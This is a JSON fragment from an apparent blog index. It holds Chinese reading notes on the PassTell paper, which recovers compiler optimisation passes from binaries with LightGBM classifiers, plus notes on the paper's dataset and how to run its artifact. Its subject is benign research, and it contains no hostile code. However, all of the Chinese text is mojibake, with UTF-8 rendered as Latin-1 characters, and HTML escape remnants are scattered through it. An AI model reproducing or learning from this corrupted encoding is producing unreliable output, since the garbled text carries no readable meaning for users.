ç„¶åï¼Œåˆ†è§£äºŒè¿›åˆ¶æ¥æ£€ç´¢æ¯ä¸ªå‡½æ•°çš„æŒ‡ä»¤ æœ€åï¼Œé€šè¿‡åˆ é™¤è¯¦ç»†çš„å†…å­˜åœ°å€ã€è°ƒç”¨ç›®æ ‡å’Œç›´æ¥å€¼æ¥å‡€åŒ–æŒ‡ä»¤ æ”¶é›†åœ¨ç¼–è¯‘æœŸé—´ä¿®æ”¹å‡½æ•°çš„ä¼˜åŒ–ä¼ é€’ï¼šå› ä¸º clang å¯ä»¥åˆ—å‡ºç¼–è¯‘æœŸé—´åº”ç”¨äºæ¯ä¸ªå‡½æ•°çš„ä¼˜åŒ–ï¼Œè¾“å‡ºè¿è¡Œçš„æ‰€æœ‰ä¼ é€’ï¼Œä½œè€…åŸºäºæ­¤è¿›è¡Œä¿®æ”¹ä»¥ä¾¿äºæå–ç¼–è¯‘æœŸé—´ä¿®æ”¹å‡½æ•°çš„ä¼˜åŒ–é€šé“ æŒ‡ä»¤æ¶ˆæ¯’ï¼šç”¨ â€œmemâ€æ ‡ç­¾æ›¿æ¢æ‰€æœ‰å†…å­˜åœ°å€ï¼Œç”¨ â€œTARGETâ€æ›¿æ¢æ‰€æœ‰è°ƒç”¨ç›®æ ‡ï¼Œç”¨â€œimmâ€æ›¿æ¢æ‰€æœ‰å³æ—¶å€¼ã€‚æˆ‘ä»¬åšå‡ºè¿™æ ·çš„è°ƒæ•´æ˜¯å› ä¸ºè¯¦ç»†çš„å†…å­˜åœ°å€ã€å³æ—¶å€¼å’Œè°ƒç”¨ç›®æ ‡åœ¨ä¸åŒçš„ç¨‹åºä¸­æ˜¯é«˜åº¦å¯å˜çš„ï¼Œåœ¨ä¼˜åŒ–åˆ†ç±»ä¸­æ²¡æœ‰ç”¨å¤„ã€‚ æ€»ç»“ï¼šè¿™éƒ¨åˆ†å¯¹åº” disassembler æ“ä½œï¼Œä¸»è¦æ˜¯å°†ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ†è§£æˆæŒ‡ä»¤ï¼Œç„¶åå¯¹æŒ‡ä»¤è¿›è¡Œæ¶ˆæ¯’ï¼Œç”¨äºåé¢çš„ç‰¹å¾æå–ã€‚\nåŠ¨æ€ç‰¹å¾ç”Ÿæˆ ä½œä¸ºæ‰©å±•ï¼Œæœ¬æ–‡è¿˜æå‡ºäº†ä¸€ç§æå–å¯„å­˜å™¨å€¼å˜åŒ– (é€šè¿‡ä»¿çœŸæ¢å¤) çš„æ–¹æ³•ï¼Œå¹¶åœ¨åˆ†ç±»å™¨ä¸­ä½¿ç”¨è¿™äº›åŠ¨æ€ç‰¹å¾ã€‚ ç›®å‰ï¼ŒåŠ¨æ€ç‰¹æ€§åªåŒ…æ‹¬å¯„å­˜å™¨å¢é‡ã€‚ åŠ å…¥è¿™ä¸ªåŠ¨æ€ç‰¹å¾çš„ç›®çš„æ˜¯ä¸ºäº†æ¢ç´¢å®ƒä»¬æé«˜åˆ†ç±»ç²¾åº¦çš„æ½œåŠ›ã€‚å¯„å­˜å™¨ä¸­çš„ä¸€äº›å˜åŒ–æ˜¯éšå¼çš„ï¼Œæˆ–è®¸å¯ä»¥æœ‰åŠ©äºåˆ†ç±»å™¨åˆ†ç±»ã€‚\nç‰¹å¾æå– é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸ƒç§ç±»å‹çš„é™æ€ç‰¹æ€§: æ“ä½œç ã€æŒ‡ä»¤ã€å¯„å­˜å™¨ã€äºŒå…ƒæ“ä½œç ã€äºŒå…ƒæŒ‡ä»¤ä»¥åŠå‡½æ•°çš„ç¬¬ä¸€æ¡å’Œæœ€åä¸€æ¡æŒ‡ä»¤ã€‚å¯„å­˜å™¨å€¼ delta æ˜¯ä¸€ä¸ªå¯é€‰ç‰¹æ€§ã€‚\nç‰¹å¾é€‰æ‹©ï¼šä»æŒ‡ä»¤ã€äºŒå…ƒæ“ä½œç ã€äºŒå…ƒæŒ‡ä»¤ã€å¯„å­˜å™¨å€¼çš„å˜åŒ–è¿™å››ç§ç‰¹å¾ç±»å‹ä¸­æ¯ç§é€‰æ‹© 1000 ä¸ªç‰¹å¾ï¼Œç”¨äºæ¯æ¬¡ä¼˜åŒ– ç­–ç•¥ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬è¿‡æ»¤æ•°æ®é›†ï¼Œä½¿å…¶åœ¨ä¼˜åŒ–è¿‡ç¨‹ä¸­ä¿æŒå¹³è¡¡ (å³ï¼Œç»è¿‡ä¼˜åŒ–çš„å‡½æ•°æ•°é‡å’Œæœªç»è¿‡ä¼˜åŒ–çš„å‡½æ•°æ•°é‡æ˜¯ç›¸åŒçš„); å…¶æ¬¡ï¼Œæˆ‘ä»¬æ ¹æ®å¹³è¡¡æ•°æ®é›†ä¸­è‡³å°‘å‡ºç°ä¸€æ¬¡è¯¥ç‰¹å¾çš„å‡½æ•°çš„æ•°é‡å¯¹ç‰¹å¾è¿›è¡Œæ’åº; æœ€åï¼Œæˆ‘ä»¬é€‰æ‹©æ¯ç§ç±»å‹çš„ 1000 ä¸ªæœ€å¸¸è§çš„ç‰¹å¾ã€‚ å¯¹äºå…¶ä»–ç‰¹å¾ç±»å‹ï¼ŒåŒ…æ‹¬æ“ä½œç ã€å¯„å­˜å™¨ã€ç¬¬ä¸€æ¡æŒ‡ä»¤å’Œæœ€åä¸€æ¡æŒ‡ä»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨è¿™äº›ç±»å‹ä¸­çš„æ‰€æœ‰ç‰¹å¾è€Œä¸åº”ç”¨ç‰¹å¾é€‰æ‹©ï¼Œå› ä¸ºè¿™äº›ç±»å‹ä¸­çš„ç‰¹å¾è¾ƒå°‘ã€‚ æ‰€æœ‰ç‰¹æ€§éƒ½æ˜¯äºŒè¿›åˆ¶å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ£€æŸ¥å‡½æ•°æ˜¯å¦å…·æœ‰è¿™ä¸ªç‰¹æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨å¾ªç¯ä¸­æ‰§è¡Œç®—æœ¯è¿ç®—çš„å¶å‡½æ•° (å³ä¸è°ƒç”¨ä»»ä½•å…¶ä»–å‡½æ•°çš„å‡½æ•°) å¯¹äºæ“ä½œç ç‰¹å¾è°ƒç”¨åº”è¯¥ä¸º 0ï¼Œå› ä¸ºå®ƒä¸åŒ…æ‹¬ä»»ä½•è°ƒç”¨; å¯¹äºæ“ä½œç ç‰¹å¾æµ‹è¯•ï¼Œå®ƒå¯èƒ½ä¸º 1ï¼Œå› ä¸ºå®ƒå¯èƒ½ä½¿ç”¨æµ‹è¯•æŒ‡ä»¤æ¥ç¡®å®šå¾ªç¯çš„ç»“æŸæ¡ä»¶ã€‚ï¼Ÿè¿™æ®µæ²¡çœ‹æ‡‚ æ€»ç»“ï¼šä¸»è¦ä»‹ç»äº†ç‰¹å¾æå–çš„ç­–ç•¥\nåˆ†ç±» åœ¨ç”Ÿæˆç‰¹å¾é›†ä¹‹åï¼Œæˆ‘ä»¬è®­ç»ƒåˆ†ç±»å™¨è¿›è¡Œä¼˜åŒ–åˆ†ç±»ã€‚å¯¹äºæ¯ä¸ªä¼˜åŒ–ï¼Œæˆ‘ä»¬è®­ç»ƒä¸€ä¸ªäºŒè¿›åˆ¶ LightGBM åˆ†ç±»å™¨[9]ï¼Œå®ƒå†³å®šä¸€ä¸ªå‡½æ•°æ˜¯å¦è¢«è¿™ä¸ªå•ä¸€ä¼˜åŒ–ä¿®æ”¹ã€‚\nLightGBM æ˜¯ä¸€ç§æ¢¯åº¦å¢å¼ºå†³ç­–æ ‘çš„å®ç°ã€‚æœ¬æ–‡é€‰æ‹©è¿™ä¸ªåˆ†ç±»å™¨è€Œä¸æ˜¯æ·±åº¦å­¦ä¹ æŠ€æœ¯æœ‰ä¸¤ä¸ªåŸå› ã€‚ ç°ä»£ç¼–è¯‘å™¨åŒ…å«å¤§é‡çš„ä¼ é€’ã€‚æ¯ä¸ªä¼ é€’éƒ½éœ€è¦ä¸€ä¸ªå•ç‹¬çš„äºŒè¿›åˆ¶åˆ†ç±»å™¨ï¼Œæ‰€ä»¥é¢å¯¹åºå¤§çš„æ•°æ®é›†ï¼Œåˆ†ç±»å™¨åº”è¯¥è¶³å¤Ÿè½»é‡ï¼Œåœ¨åœ¨è®­ç»ƒæ—¶é—´å’Œå†…å­˜æ¶ˆè€—æ–¹é¢éƒ½èƒ½å¾ˆå¥½åœ°æ‰©å±•ã€‚ åƒæ”¯æŒå‘é‡æœºå’Œç¥ç»ç½‘ç»œè¿™æ ·çš„åˆ†ç±»å™¨ä¸èƒ½è½»æ˜“åœ°è¯æ˜ç‰¹å¾çš„æ¨ç†æˆ–é‡è¦æ€§ã€‚å¦ä¸€æ–¹é¢ï¼ŒåŸºäºå†³ç­–æ ‘çš„åˆ†ç±»å™¨å¯ä»¥æ›´å®¹æ˜“åœ°æ˜¾ç¤ºç‰¹å¾çš„æ¨ç†å’Œé‡è¦æ€§ã€‚ï¼ˆè¿™é‡Œå¯ä»¥ç†è§£ä¸ºåŸºäºå†³ç­–æ ‘çš„åˆ†ç±»å™¨çš„ç»“æœå¯æ¥å—æ€§æ›´å¼ºï¼Ÿï¼‰ åœ¨è®­ç»ƒé˜¶æ®µï¼Œç”Ÿæˆæ‰€æœ‰ä¼˜åŒ–ä¼ é€’çš„åˆ—è¡¨ï¼Œå¹¶ä¸ºæ¯ä¸ªä¼˜åŒ–ä¼ é€’åˆ›å»ºæ¨¡å‹ã€‚æ¯ä¸ªä¼˜åŒ–ä¼ é€’éƒ½å¯¹åº”è¿™ä¸€ä¸ªåˆ†ç±»å™¨ï¼Œè¯¥åˆ†ç±»å™¨å¯ä»¥æ­ç¤ºå‡½æ•°æ˜¯å¦åº”ç”¨äº†åˆ†ç±»å™¨å¯¹åº”çš„ä¼˜åŒ–ä¼ é€’ã€‚\nå®æ–½ æ•°æ®é›†ç”Ÿæˆ ç”¨ Python å®ç°äº†æ•°æ®é›†ç”Ÿæˆç»„ä»¶ã€‚é‡‡ç”¨æºä»£ç å­˜å‚¨åº“ï¼Œä½¿ç”¨å››ä¸ªä¼˜åŒ–çº§åˆ« (-O0ã€-O1ã€-O2 å’Œ-O3) å¯¹å…¶è¿›è¡Œç¼–è¯‘ã€‚ ç¼–è¯‘æ—¶ä»ç¼–è¯‘å™¨æ—¥å¿—ä¸­æå–æ¯ä¸ªå‡½æ•°çš„ä¼˜åŒ–ä¼ é€’ ç¼–è¯‘åç”¨ objdump åˆ†è§£äºŒè¿›åˆ¶æ–‡ä»¶ é€šè¿‡åˆ é™¤è¯¦ç»†çš„å†…å­˜åœ°å€ã€è°ƒç”¨ç›®æ ‡å’Œç«‹å³å€¼å¯¹æŒ‡ä»¤è¿›è¡Œæ¶ˆæ¯’ã€‚ åœ¨ LLVM çš„é—ç•™ä¼ é€’ç®¡ç†å™¨çš„ç°æœ‰è¾“å‡ºæ ‡å¿—ä¸­æ·»åŠ äº†ä¸€ä¸ªé€‰é¡¹ï¼Œä»¥åˆ—å‡ºä¿®æ”¹å‡½æ•°æˆ–å‡½æ•°å†…ç»„ä»¶ (ä¾‹å¦‚ï¼Œå¾ªç¯) çš„ä¼˜åŒ–ä¼ é€’ã€‚ åŠ¨æ€ç‰¹å¾ç”Ÿæˆ ä½¿ç”¨ Zelos ï¼Œä¸€ä¸ªåŸºäº python çš„äºŒè¿›åˆ¶ä»¿çœŸå™¨å¹³å°ï¼Œå¯¹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ¯ä¸ªå‡½æ•°è¿›è¡Œå¼ºåˆ¶æ¨¡æ‹Ÿï¼Œå¹¶åœ¨å‡½æ•°è¾¹ç•Œå†…çš„æ¯æ¡æŒ‡ä»¤ä¹‹åè®°å½•å¯„å­˜å™¨å€¼çš„å˜åŒ–ã€‚ ç‰¹å¾æå–å’Œåˆ†ç±» ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæœ¬æ–‡å°†é™æ€å’ŒåŠ¨æ€ç‰¹å¾çš„æå–é˜¶æ®µå’Œåˆ†ç±»å™¨ç»“åˆåˆ°ä¸€ä¸ªåˆ†ç±»å™¨ç»„ä»¶ä¸­ã€‚ æˆ‘ä»¬ä½¿ç”¨ Python å’Œ LightGBM åº“å®ç°äº†æˆ‘ä»¬çš„åˆ†ç±»å™¨ã€‚åˆ†ç±»å™¨éå†æ¯ä¸ªä¼˜åŒ–è¿‡ç¨‹ï¼Œé€‰æ‹©å¹¶æå–ç‰¹å¾ï¼Œç„¶ååˆ›å»ºä¸€ä¸ª LGBMClassifierã€‚åœ¨è®­ç»ƒæ—¶ï¼Œåˆ†ç±»å™¨é¦–å…ˆè¿‡æ»¤æ•°æ®é›†ï¼Œä½¿æ•°æ®é›†å¹³è¡¡ï¼Œå…·æœ‰ç›¸åŒæ•°é‡çš„æ­£æ•°æ®å’Œè´Ÿæ•°æ®ã€‚ç„¶åï¼Œåˆ†ç±»å™¨é€‰æ‹©ç¬¬ 4.3 èŠ‚ä¸­æè¿°çš„æœ€æµè¡Œçš„ç‰¹å¾ï¼Œæå–é™æ€å’ŒåŠ¨æ€ç‰¹å¾ï¼Œå¹¶è®­ç»ƒ LGBMClassifierã€‚åˆ†ç±»å™¨åœ¨è¿›è¡Œåˆ†ç±»æ—¶ï¼Œæå–é™æ€å’ŒåŠ¨æ€ç‰¹å¾ï¼Œå¹¶ä½¿ç”¨ LGBMClassifier æ¥é¢„æµ‹è¯¥å‡½æ•°æ˜¯å¦åœ¨æ­¤ä¼˜åŒ–è¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚åœ¨åˆ†ç±»å™¨æå–ç‰¹å¾å¹¶å¯¹æ‰€æœ‰ä¼˜åŒ–è¿‡ç¨‹è¿›è¡Œåˆ†ç±»ä¹‹åï¼Œå®ƒå°†ç»“æœåˆå¹¶åœ¨ä¸€èµ·ä»¥ç”Ÿæˆæœ€ç»ˆç»“æœï¼Œå³åº”ç”¨äºå‡½æ•°çš„ä¼˜åŒ–åˆ—è¡¨ã€‚ è¯„ä»· ç¼–è¯‘å™¨é…ç½®è¯†åˆ« å¯¹äºç¼–è¯‘å™¨æ—ã€ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«çš„è¯†åˆ«ï¼ŒNeuralCI å®ç°äº† 76.6%çš„å¹³å‡ F-1 è¯„åˆ†ï¼Œè€Œæˆ‘ä»¬çš„æ–¹æ³•å®ç°äº† 83.2%çš„å¹³å‡ F-1 è¯„åˆ†ã€‚æˆ‘ä»¬å¯¹ NeuralCI çš„é‡æ–°å®ç°äº§ç”Ÿäº†è¾ƒä½çš„ç»“æœï¼Œå¦‚ä»–ä»¬çš„è®ºæ–‡[20]æ‰€æŠ¥é“çš„é‚£æ ·ã€‚æˆ‘ä»¬å°†è¿™ç§å˜åŒ–å½’å› äºæ­£ç¡®å¹³è¡¡çš„æ•°æ®é›†ã€‚æ€»çš„æ¥è¯´ï¼Œç»“æœè¡¨æ˜æˆ‘ä»¬çš„æ–¹æ³•åœ¨è¯†åˆ«ç¼–è¯‘å™¨å®¶æ—ã€ä¸»è¦ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«æ–¹é¢æ¯” NeuralCI è¡¨ç°å¾—æ›´å¥½ã€‚ å®éªŒè¡¨æ˜è¯†åˆ«ç”¨ Clang ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¼˜åŒ–çº§åˆ«å’Œç¼–è¯‘å™¨ç‰ˆæœ¬æ›´å…·æŒ‘æˆ˜æ€§ã€‚è€Œå¯¹äºå¯¹äº GCC å’Œ ICC æ„å»ºçš„å‡½æ•°ï¼Œè¿™ä¸¤ç§æ–¹æ³•åœ¨è¯†åˆ«ç¼–è¯‘å™¨æ—ã€ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œä¼˜åŒ–çº§åˆ«æ–¹é¢éƒ½è¾¾åˆ°äº†å¾ˆé«˜çš„ç²¾åº¦ã€‚ ä¼˜åŒ–ä¼ é€’è¯†åˆ« æ€»çš„æ¥è¯´ï¼Œæˆ‘ä»¬çš„æ–¹æ³•è¾¾åˆ°äº†å¹³å‡ 92.1%çš„ F-1 åˆ†æ•°ã€‚ ç ”ç©¶ç»“æœè¿›ä¸€æ­¥è¡¨æ˜ï¼Œä¸ Pizzolotto å’Œ Inoue[15]çš„è¯´æ³•ç›¸åï¼Œå³ä½¿æ˜¯çœ‹èµ·æ¥ä¸å¤ªå¯èƒ½è¢«æ£€æµ‹åˆ°çš„ä¼ é€’ï¼Œæ¯”å¦‚æ­»ä»£ç æ¶ˆé™¤ï¼Œä¹Ÿå¯ä»¥è¢«é«˜ç²¾åº¦åœ°è¯†åˆ«å‡ºæ¥ã€‚ ä¼˜åŒ–è¯±å‘æ¼æ´æ¡ˆä¾‹ç ”ç©¶ ç•¥\nThe Effects of the Dynamic Features å±€é™æ€§ æ²¡æœ‰ç ”ç©¶åº”ç”¨äºè¾ƒå¤§å•å…ƒ (å¦‚æ¨¡å—å’Œè°ƒç”¨å›¾) çš„ä¼˜åŒ–ä¼ é€’ã€‚ æˆ‘ä»¬çš„æ•°æ®æ”¶é›†ç»„ä»¶ä¸æ”¯æŒåœ¨é“¾æ¥æ—¶æå–åº”ç”¨çš„æ•´ä¸ªç¨‹åºä¼˜åŒ– æˆ‘ä»¬çš„æ–¹æ³•åªé’ˆå¯¹ç¼–è¯‘å™¨ç›´æ¥ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å› æ­¤ï¼Œå®ƒä¸èƒ½ç”¨äºç¼–è¯‘åä¿®æ”¹äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µï¼Œä¾‹å¦‚æ··æ·†çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–åº”ç”¨äº†äºŒè¿›åˆ¶è¡¥ä¸çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level/","summary":"ä¸­æ–‡è¯‘åï¼šäºŒè¿›åˆ¶çº§ç»†ç²’åº¦ç¼–è¯‘å™¨å·¥ä»¶çš„è‡ªåŠ¨æ¢å¤ ä½œè€…ï¼šYufei Du å•ä½ï¼šåŒ—å¡ç½—æ¥çº³å¤§å­¦æ•™å ‚å±±åˆ†æ ¡ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2022å¹´ æ¥æºï¼š #USENI","title":"Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level"},{"content":"[[Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level]] GitHub åœ°å€ï¼šzeropointdynamics/passtell (github.com)\næ•°æ®é›†ç»“æ„ passtell_dataset. tar. xz ï¼šPassTell å®éªŒä¸­ä½¿ç”¨çš„æ•°æ®é›†çš„å­˜æ¡£ï¼ŒåŒ…æ‹¬: \u0026rsquo; balanced_dataset. csv \u0026lsquo;: ç”¨äºç²—ç²’åº¦ç¼–è¯‘å™¨é…ç½®åˆ†ç±»çš„æ•°æ®é›†ã€‚å¦‚ç¬¬ 6.1 èŠ‚æ‰€è¿°ï¼Œæ­¤æ•°æ®é›†æ˜¯ NeuralCI ä¸­ä½¿ç”¨çš„æ•°æ®é›†çš„å¹³è¡¡å­é›†ã€‚ ç”¨äº 6.1 èŠ‚çš„å®éªŒâ€”â€”ç¼–è¯‘å™¨é…ç½®è¯†åˆ« æ•°æ®é›†ç”±æ•°æ®é›†ä¸­æ‰€æœ‰åŠ¨æ€é“¾æ¥çš„æœªåˆ†è§£çš„å¯æ‰§è¡Œæ–‡ä»¶ç»„æˆï¼ŒåŒ…æ‹¬ binutilsã€busyboxã€coreutilsã€curlã€ffmpegã€gitã€gslã€libpngã€opensslã€postgresqlã€sqliteã€valgrindã€vimã€zlib å’Œ gdbã€‚ \u0026rsquo; data. csv \u0026lsquo;: ç”¨äº 6.2 èŠ‚ä¸­ä½¿ç”¨çš„ç»†ç²’åº¦ç¼–è¯‘å™¨ä¼ é€’åˆ†ç±»çš„æ•°æ®é›†ã€‚ ç”¨äº 6.2 èŠ‚å®éªŒâ€”â€”ä¼˜åŒ–ä¼ é€’è¯†åˆ« ç¼–è¯‘å™¨ä¼ é€’æ•°æ®é›†ç”±æ¥è‡ªç”¨ Clang 14 ç¼–è¯‘çš„ binutils (2.37)ã€coreutils (9.0)ã€httpd (2.4.51) å’Œ sqlite (3.36.0) ç¨‹åºçš„å‡½æ•°ç»„æˆï¼Œä½¿ç”¨-O0ã€-O1ã€-O2 å’Œ-O3 ä¼˜åŒ–çº§åˆ«ï¼Œåœ¨ 552 ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ç”Ÿæˆæ€»å…± 149, 814 ä¸ªå‡½æ•°ã€‚ç„¶åï¼Œæˆ‘ä»¬ä¸ºæ¯ä¸€æ¬¡ä¼ é€’å¹³è¡¡æ•°æ®é›†: å¯¹äºæ¯ä¸€æ¬¡ä¼ é€’ï¼Œæˆ‘ä»¬éšæœºé€‰æ‹©ç­‰é‡çš„åº”ç”¨äº†ä¼ é€’çš„å‡½æ•° (å³æ­£æ ·æœ¬) å’Œæ²¡æœ‰åº”ç”¨ä¼ é€’çš„å‡½æ•° (å³è´Ÿæ ·æœ¬)ã€‚æˆ‘ä»¬è¿˜å°†æ¯æ¬¡ä¼ é€’çš„æœ€å¤§æ ·æœ¬æ•°é‡é™åˆ¶ä¸º 5, 000 ä¸ªæ­£æ ·æœ¬å’Œ 5, 000 ä¸ªè´Ÿæ ·æœ¬ã€‚ \u0026rsquo; data_dynamic. Csv \u0026lsquo;: ç¬¬ 6.4 èŠ‚ä¸­ç”¨äºåŠ¨æ€ç‰¹å¾è¯„ä¼°çš„æ•°æ®é›†ã€‚å¦‚ç¬¬ 6.4 èŠ‚æ‰€è¿°ï¼Œæ­¤æ•°æ®é›†æ˜¯\u0026rsquo; data. Csv \u0026lsquo;çš„å­é›†ï¼Œä»…åŒ…å«åŠ¨æ€ç‰¹å¾è¦†ç›–ç‡è‡³å°‘ä¸º 70%çš„å‡½æ•°ã€‚ 6.4 èŠ‚çš„å®éªŒâ€”â€”åŠ¨æ€ç‰¹å¾çš„æ•ˆæœ ä½¿ç”¨ä¸ç¬¬ 6.2 èŠ‚ç›¸åŒçš„æ•°æ®é›†ï¼Œä½†åº”ç”¨äº†é¢å¤–çš„è¿‡æ»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå› ä¸ºæˆ‘ä»¬çš„åŠ¨æ€ç‰¹å¾ç”Ÿæˆå™¨çš„å½“å‰å®ç°æ— æ³•ä¸ºæ•°æ®é›†ä¸­çš„æ‰€æœ‰å‡½æ•°ç”Ÿæˆæ³¨å†Œç‰¹å¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¹æ•°æ®é›†è¿›è¡Œç­›é€‰ï¼ŒåªåŒ…æ‹¬ç”Ÿæˆå™¨è¾¾åˆ°æœ€å°è¦†ç›–é˜ˆå€¼çš„å‡½æ•°ã€‚ä¸ºäº†ä¸åŸºçº¿è¿›è¡Œæ¯”è¾ƒï¼Œæˆ‘ä»¬åŒæ—¶ä½¿ç”¨é™æ€ç‰¹å¾å’ŒåŠ¨æ€ç‰¹å¾æ¥è¿è¡Œæˆ‘ä»¬çš„æ–¹æ³•ã€‚å¯¹äºåè€…ï¼Œæˆ‘ä»¬å°†è¦†ç›–ç‡é˜ˆå€¼è®¾ç½®ä¸º 30%åˆ° 60%ã€‚å¯¹äºè¿™äº›é…ç½®ï¼Œæˆ‘ä»¬ä½¿ç”¨ç›¸åŒçš„è¿‡æ»¤æ•°æ®é›†ï¼Œå¹¶äººä¸ºåœ°åˆ é™¤åŠ¨æ€ç‰¹å¾ä»¥è¾¾åˆ°ç›®æ ‡è¦†ç›–ç‡ã€‚ \u0026rsquo; config_classifier. py \u0026lsquo;: ç²—ç²’åº¦çš„ç¼–è¯‘å™¨é…ç½®åˆ†ç±»å™¨ã€‚For 6.1 èŠ‚ \u0026rsquo; passtel . py \u0026lsquo;: ç»†ç²’åº¦çš„ç¼–è¯‘å™¨ä¼ é€’åˆ†ç±»å™¨ã€‚For 6.2 èŠ‚ \u0026rsquo; static_opcode_features. py \u0026lsquo;: \u0026rsquo; passtel . py \u0026lsquo;æ‰€éœ€çš„åº“æ¨¡å—ã€‚ For 6.4 èŠ‚ ä¾èµ– 64 ä½ Linux æœºå™¨ï¼Œè‡³å°‘æœ‰ 32GB RAM å’Œ 16GB å­˜å‚¨ç©ºé—´ã€‚æˆ‘ä»¬å·²ç»åœ¨ Arch Linux (æ»šåŠ¨å‘å¸ƒï¼Œäº 2022 å¹´ 5 æœˆæ›´æ–°)ï¼ŒUbuntu 20.04 (Windows Subsystem for Linux) å’Œ Fedora Workstation 36 ä¸Šæµ‹è¯•äº†æˆ‘ä»¬çš„å·¥ä»¶ã€‚ Python 3ã€‚å¯¹äº Ubuntu å’Œå…¶ä»–æ²¡æœ‰é»˜è®¤\u0026rsquo; python \u0026lsquo;å‘½ä»¤çš„ Linux å‘è¡Œç‰ˆï¼Œéœ€è¦å°†ç¬¦å·é“¾æ¥ä»\u0026rsquo; python \u0026lsquo;è®¾ç½®ä¸º\u0026rsquo; python3 \u0026lsquo;ã€‚åœ¨ Ubuntu ä¸Šï¼Œè¿™å¯ä»¥é€šè¿‡å®‰è£…\u0026rsquo; python-is-python3 \u0026lsquo;åŒ…æ¥å®ç°ã€‚ä¸€äº›å‘è¡Œç‰ˆ (å¦‚ Fedora) æ²¡æœ‰ Python C APIï¼Œè¿˜éœ€è¦å®‰è£… Python C APIã€‚åœ¨ Fedora ä¸Šï¼Œå¯ä»¥é€šè¿‡å®‰è£…\u0026rsquo; python3-devel \u0026lsquo;åŒ…æ¥å®ç°ã€‚ Graphvizã€‚ \u0026rsquo; requirements. txt \u0026lsquo;ä¸­åŒ…å«çš„ Python åº“ã€‚è¿™äº›åº“å¯ä»¥ä½¿ç”¨å‘½ä»¤\u0026rsquo; pip install -r requirements. txt \u0026lsquo;å®‰è£…ã€‚ è¿è¡Œ æ¦‚è¿° è¿è¡Œç²—ç²’åº¦åˆ†ç±»å™¨ è¦é‡ç°ç¬¬ 6.1 èŠ‚çš„ç»“æœï¼Œè¯·è¿è¡Œ python config_classifier.pyã€‚æˆ‘ä»¬ä½¿ç”¨ LightGBM çš„ MLJAR AutoML åŒ…è£…å™¨æ¥æ–¹ä¾¿åœ°å†ç°æ··æ·†çŸ©é˜µã€‚ç”±äº\u0026rsquo; numpy \u0026lsquo;ç‰ˆæœ¬å·ä¸åŒï¼Œåˆ†ç±»å™¨å¯èƒ½ä¼šæŠ¥å‘Šé”™è¯¯ï¼Œä½†è¿™äº›é”™è¯¯ä¸ä¼šå½±å“åˆ†ç±»ã€‚ä¸€æ—¦åˆ†ç±»å™¨ç»ˆæ­¢ï¼ŒF-1 åˆ†æ•°å¯ä»¥åœ¨\u0026rsquo; automl1 /README ä¸­æ‰¾åˆ°ã€‚md \u0026lsquo;ä½œä¸º\u0026rsquo; metric_value \u0026lsquo;ï¼Œè§„èŒƒåŒ–çš„æ··æ·†çŸ©é˜µ (å›¾ 2) å¯ä»¥åœ¨\u0026rsquo; AutoML_1/ 1_Default_LightGBM/confusion_matrix_normalized. png \u0026lsquo;ä¸­æ‰¾åˆ°ã€‚ æ³¨æ„ï¼Œè™½ç„¶ç¬¬ 6.1 èŠ‚ä¹ŸåŒ…æ‹¬äº†æ¥è‡ª NeuralCI çš„ç»“æœï¼Œä½† NeuralCI çš„ä»£ç å¹¶ä¸æ˜¯æˆ‘ä»¬å·¥ä»¶çš„ä¸€éƒ¨åˆ†ã€‚\nè¿è¡Œç»†ç²’åº¦åˆ†ç±»å™¨ Static Features è¦é‡ç° 6.2 èŠ‚çš„ç»“æœï¼Œè¯·è¿è¡Œ python passtell.py --train_csv data.csvã€‚ç¨‹åºç»“æŸåï¼Œåˆ†ç±»ç»“æœå¯ä»¥åœ¨ passtell_model/pass_classification_results.csv ä¸­æ‰¾åˆ°ã€‚â€œpasstell_modelâ€ç›®å½•ä¸­è¿˜åŒ…å«äº†æ˜¾ç¤ºæ¯æ¬¡ä¼ é€’çš„ä¸»è¦ç‰¹æ€§çš„å›¾å½¢ã€‚è¯·æ³¨æ„ï¼Œç”±äºéšæœºè®­ç»ƒå’Œæµ‹è¯•é›†çš„åˆ†è£‚ã€åˆ†ç±»å™¨ä¸­çš„ä¿®å¤ä»¥åŠåº“çš„ä¸åŒç‰ˆæœ¬ï¼Œè®­ç»ƒå’Œæµ‹è¯•æ ·æœ¬çš„æ•°é‡å¯èƒ½ä¼šæœ‰å¾®å°çš„å˜åŒ–ã€‚åŒæ ·ï¼Œç”±äºéšæœºåŒ–çš„è®­ç»ƒé›†ï¼Œæ¯ä¸€æ¬¡ä¼ é€’çš„ç¡®åˆ‡é¡¶éƒ¨ç‰¹å¾å¯èƒ½ä¸æˆ‘ä»¬åœ¨è®ºæ–‡ä¸­å±•ç¤ºçš„é¡¶éƒ¨ç‰¹å¾ä¸åŒ (å›¾ 4 å’Œå›¾ 